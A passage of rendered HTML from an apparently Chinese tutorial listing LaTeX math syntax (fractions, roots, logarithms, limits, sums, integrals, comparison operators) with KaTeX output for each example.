class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>∗</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \ast y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">∗</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  除法运算，符号：<code>\div</code>，如：<code>x \div y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>÷</mo><mi>y</mi></mrow><annotation encoding="application/x-tex">x \div y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">÷</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  斜法运算，符号：<code>/</code>，如：<code>x / y</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mi mathvariant="normal">/</mi><mi>y</mi></mrow><annotation encoding="application/x-tex">x / y</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault">x</span><span class="mord">/</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span></span>。<br />  分式表示，符号：<code>\frac&#123;分子&#125;&#123;分母&#125;</code>，如：<code>\frac&#123;x+y&#125;&#123;y+z&#125;</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi>x</mi><mo>+</mo><mi>y</mi></mrow><mrow><mi>y</mi><mo>+</mo><mi>z</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{x+y}{y+z}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.335547em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854439em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight" style="margin-right:0.04398em;">z</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。<br />  分式表示，符号：<code>&#123;分子&#125; \voer &#123;分母&#125;</code>，如：<code>&#123;x+y&#125; \over &#123;y+z&#125;</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi>x</mi><mo>+</mo><mi>y</mi></mrow><mrow><mi>y</mi><mo>+</mo><mi>z</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">{x+y} \over {y+z}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.335547em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.854439em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight" style="margin-right:0.04398em;">z</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.446108em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mbin mtight">+</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。<br />  绝对值表示，符号：<code>||</code>，如：<code>|x + y|</code>=&gt; <span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi mathvariant="normal">∣</mi><mi>x</mi><mo>+</mo><mi>y</mi><mi mathvariant="normal">∣</mi></mrow><annotation encoding="application/x-tex">|x + y|</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">∣</span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord">∣</span></span></span></span>。</p><h2 id="高级运算"><a class="markdownIt-Anchor" href="#高级运算"></a> 高级运算</h2><p>  平均数运算，符号：<code>\overline&#123;算式&#125;</code>，如：<code>\overline&#123;xyz&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mover accent="true"><mrow><mi>x</mi><mi>y</mi><mi>z</mi></mrow><mo stretchy="true">‾</mo></mover></mrow><annotation encoding="application/x-tex">\overline{xyz}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.825em;vertical-align:-0.19444em;"></span><span class="mord overline"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.63056em;"><span style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span><span style="top:-3.55056em;"><span class="pstrut" style="height:3em;"></span><span class="overline-line" style="border-bottom-width:0.04em;"></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.19444em;"><span></span></span></span></span></span></span></span></span>。<br />  开二次方运算，符号：<code>\sqrt</code>，如：<code>\sqrt x</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msqrt><mi>x</mi></msqrt></mrow><annotation encoding="application/x-tex">\sqrt x</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.23972em;"></span><span class="mord sqrt"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8002800000000001em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord mathdefault" style="padding-left:0.833em;">x</span></span><span style="top:-2.76028em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.23972em;"><span></span></span></span></span></span></span></span></span>。<br />  开方运算，符号：<code>\sqrt[开方数]&#123;被开方数&#125;</code>，如：<code>\sqrt[3]&#123;x+y&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mroot><mrow><mi>x</mi><mo>+</mo><mi>y</mi></mrow><mn>3</mn></mroot></mrow><annotation encoding="application/x-tex">\sqrt[3]{x+y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.04em;vertical-align:-0.26055499999999987em;"></span><span class="mord sqrt"><span class="root"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.6335540000000002em;"><span style="top:-2.811334em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size6 size1 mtight"><span class="mord mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.7794450000000002em;"><span class="svg-align" style="top:-3em;"><span class="pstrut" style="height:3em;"></span><span class="mord" style="padding-left:0.833em;"><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-2.739445em;"><span class="pstrut" style="height:3em;"></span><span class="hide-tail" style="min-width:0.853em;height:1.08em;"><svg width='400em' height='1.08em' viewBox='0 0 400000 1080' preserveAspectRatio='xMinYMin slice'><path d='M95,702c-2.7,0,-7.17,-2.7,-13.5,-8c-5.8,-5.3,-9.5,-10,-9.5,-14c0,-2,0.3,-3.3,1,-4c1.3,-2.7,23.83,-20.7,67.5,-54c44.2,-33.3,65.8,-50.3,66.5,-51c1.3,-1.3,3,-2,5,-2c4.7,0,8.7,3.3,12,10s173,378,173,378c0.7,0,35.3,-71,104,-213c68.7,-142,137.5,-285,206.5,-429c69,-144,104.5,-217.7,106.5,-221c5.3,-9.3,12,-14,20,-14H400000v40H845.2724s-225.272,467,-225.272,467s-235,486,-235,486c-2.7,4.7,-9,7,-19,7c-6,0,-10,-1,-12,-3s-194,-422,-194,-422s-65,47,-65,47z M834 80H400000v40H845z'/></svg></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.26055499999999987em;"><span></span></span></span></span></span></span></span></span>。<br />  对数运算，符号：<code>\log</code>，如：<code>\log(x)</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>log</mi><mo>⁡</mo><mo stretchy="false">(</mo><mi>x</mi><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">\log(x)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mop">lo<span style="margin-right:0.01389em;">g</span></span><span class="mopen">(</span><span class="mord mathdefault">x</span><span class="mclose">)</span></span></span></span>。<br />  极限运算，符号：<code>\lim</code>，如：<code>\lim^&#123;x \to \infty&#125;_&#123;y \to 0&#125;&#123;\frac&#123;x&#125;&#123;y&#125;&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>y</mi><mo>→</mo><mn>0</mn></mrow><mrow><mi>x</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></msubsup><mfrac><mi>x</mi><mi>y</mi></mfrac></mrow><annotation encoding="application/x-tex">\lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2298399999999998em;vertical-align:-0.481108em;"></span><span class="mop"><span class="mop">lim</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.748732em;"><span style="top:-2.4530000000000003em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.1473400000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.383108em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span>。<br />​  极限运算，符号：<code>\displaystyle \lim</code>，如：<code>\displaystyle \lim^&#123;x \to \infty&#125;_&#123;y \to 0&#125;&#123;\frac&#123;x&#125;&#123;y&#125;&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munderover><mo><mi>lim</mi><mo>⁡</mo></mo><mrow><mi>y</mi><mo>→</mo><mn>0</mn></mrow><mrow><mi>x</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munderover><mfrac><mi>x</mi><mi>y</mi></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle \lim^{x \to \infty}_{y \to 0}{\frac{x}{y}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.176272em;vertical-align:-0.8804400000000001em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.2958319999999999em;"><span style="top:-2.082892em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span><span style="top:-2.7em;"><span class="pstrut" style="height:2.7em;"></span><span><span class="mop">lim</span></span></span><span style="top:-3.59444em;margin-left:0em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.853216em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span>。<br />  求和运算，符号：<code>\sum</code>，如：<code>\sum^&#123;x \to \infty&#125;_&#123;y \to 0&#125;&#123;\frac&#123;x&#125;&#123;y&#125;&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mo>∑</mo><mrow><mi>y</mi><mo>→</mo><mn>0</mn></mrow><mrow><mi>x</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></msubsup><mfrac><mi>x</mi><mi>y</mi></mfrac></mrow><annotation encoding="application/x-tex">\sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.2854em;vertical-align:-0.481108em;"></span><span class="mop"><span class="mop op-symbol small-op" style="position:relative;top:-0.0000050000000000050004em;">∑</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.804292em;"><span style="top:-2.40029em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.2029em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.43581800000000004em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.695392em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span>。<br />  求和运算，符号：<code>\displaystyle \sum</code>，如：<code>\displaystyle \sum^&#123;x \to \infty&#125;_&#123;y \to 0&#125;&#123;\frac&#123;x&#125;&#123;y&#125;&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><munderover><mo>∑</mo><mrow><mi>y</mi><mo>→</mo><mn>0</mn></mrow><mrow><mi>x</mi><mo>→</mo><mi mathvariant="normal">∞</mi></mrow></munderover><mfrac><mi>x</mi><mi>y</mi></mfrac></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle \sum^{x \to \infty}_{y \to 0}{\frac{x}{y}}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:3.0546180000000005em;vertical-align:-1.403221em;"></span><span class="mop op-limits"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.6513970000000002em;"><span style="top:-1.8828869999999998em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span><span class="mrel mtight">→</span><span class="mord mtight">0</span></span></span></span><span style="top:-3.0500049999999996em;"><span class="pstrut" style="height:3.05em;"></span><span><span class="mop op-symbol large-op">∑</span></span></span><span style="top:-4.300005em;margin-left:0em;"><span class="pstrut" style="height:3.05em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mathdefault mtight">x</span><span class="mrel mtight">→</span><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:1.403221em;"><span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.10756em;"><span style="top:-2.314em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault" style="margin-right:0.03588em;">y</span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.677em;"><span class="pstrut" style="height:3em;"></span><span class="mord"><span class="mord mathdefault">x</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.8804400000000001em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span></span>。<br />  积分运算，符号：<code>\int</code>，如<code>\int^&#123;\infty&#125;_&#123;0&#125;&#123;xdx&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><msubsup><mo>∫</mo><mn>0</mn><mi mathvariant="normal">∞</mi></msubsup><mrow><mi>x</mi><mi>d</mi><mi>x</mi></mrow></mrow><annotation encoding="application/x-tex">\int^{\infty}_{0}{xdx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.215112em;vertical-align:-0.35582em;"></span><span class="mop"><span class="mop op-symbol small-op" style="margin-right:0.19445em;position:relative;top:-0.0005599999999999772em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8592920000000001em;"><span style="top:-2.34418em;margin-left:-0.19445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span><span style="top:-3.2579000000000002em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.35582em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">d</span><span class="mord mathdefault">x</span></span></span></span></span>。<br />  积分运算，符号：<code>\displaystyle \int</code>，如：<code>\displaystyle \int^&#123;\infty&#125;_&#123;0&#125;&#123;xdx&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mstyle scriptlevel="0" displaystyle="true"><msubsup><mo>∫</mo><mn>0</mn><mi mathvariant="normal">∞</mi></msubsup><mrow><mi>x</mi><mi>d</mi><mi>x</mi></mrow></mstyle></mrow><annotation encoding="application/x-tex">\displaystyle \int^{\infty}_{0}{xdx}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:2.326242em;vertical-align:-0.9119499999999999em;"></span><span class="mop"><span class="mop op-symbol large-op" style="margin-right:0.44445em;position:relative;top:-0.0011249999999999316em;">∫</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:1.414292em;"><span style="top:-1.7880500000000001em;margin-left:-0.44445em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">0</span></span></span></span><span style="top:-3.8129000000000004em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">∞</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.9119499999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathdefault">x</span><span class="mord mathdefault">d</span><span class="mord mathdefault">x</span></span></span></span></span>。<br />  微分运算，符号：<code>\partial</code>，如：<code>\frac&#123;\partial x&#125;&#123;\partial y&#125;</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mfrac><mrow><mi mathvariant="normal">∂</mi><mi>x</mi></mrow><mrow><mi mathvariant="normal">∂</mi><mi>y</mi></mrow></mfrac></mrow><annotation encoding="application/x-tex">\frac{\partial x}{\partial y}</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.3612159999999998em;vertical-align:-0.481108em;"></span><span class="mord"><span class="mopen nulldelimiter"></span><span class="mfrac"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8801079999999999em;"><span style="top:-2.6550000000000002em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault mtight" style="margin-right:0.03588em;">y</span></span></span></span><span style="top:-3.23em;"><span class="pstrut" style="height:3em;"></span><span class="frac-line" style="border-bottom-width:0.04em;"></span></span><span style="top:-3.394em;"><span class="pstrut" style="height:3em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight" style="margin-right:0.05556em;">∂</span><span class="mord mathdefault mtight">x</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.481108em;"><span></span></span></span></span></span><span class="mclose nulldelimiter"></span></span></span></span></span>。</p><h2 id="逻辑运算"><a class="markdownIt-Anchor" href="#逻辑运算"></a> 逻辑运算</h2><p>  等于运算，符号：<code>=</code>，如：<code>x + y = z</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>=</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x + y = z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>。<br />  大于运算，符号：<code>&gt;</code>，如：<code>x + y &gt; z</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>&gt;</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x + y &gt; z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>。<br />  小于运算，符号：<code>&lt;</code>，如：<code>x + y &lt; z</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>&lt;</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x + y &lt; z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7335400000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&lt;</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathdefault" style="margin-right:0.04398em;">z</span></span></span></span>。<br />  大于等于运算，符号：<code>\geq</code>，如：<code>x+y \geq z</code>=&gt;<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>x</mi><mo>+</mo><mi>y</mi><mo>≥</mo><mi>z</mi></mrow><annotation encoding="application/x-tex">x+y \geq z</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathdefault">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8304100000000001em;vertical-align:-0.19444em;"></span><span class="mord mathdefault" style="margin-right:0.03588em;">y</span><span class="mspace" 